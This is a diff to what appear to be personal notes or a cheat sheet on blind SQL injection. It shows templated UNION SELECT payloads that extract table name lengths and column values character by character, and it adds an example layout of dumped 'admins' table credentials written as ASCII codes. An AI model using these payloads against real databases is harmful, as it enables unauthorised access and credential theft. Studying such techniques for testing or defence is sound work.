@@ -2,6 +2,23 @@
   ' UNION SELECT 1, #, #... WHERE ascii(SUBSTRING('A', 1, 1)) = 65-- -
 
 
+
+
+Might help to organize your data like this:
+table name: admins
+  columns:
+    (index, name)
+    1 - username
+        rows (index, lenght)
+            0 - 7 - [101, 108, 105, 110, 111, 114, 101, ] = elinore
+
+    2 - password
+        rows (index, lenght)
+          0 - 6 - [112, 97, 109, 117, 108, 97] = pamula
+
+
+
+
 - Dumping the LENGHT of a table name:
 ' UNION SELECT 1 WHERE (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT {index},1) = {LENGHT}-- -
 
@@ -66,6 +83,8 @@ To extract the value of {column_name} for row {row_index}, one character at a ti
 Replace {column_name} with the column name (e.g., password).
 Replace {row_index} with the index of the row (e.g., 0 for the first row).
 Replace {position} with the position of the character to extract (1 for the first character, 2 for the second, etc.).
+
+
 
 
 
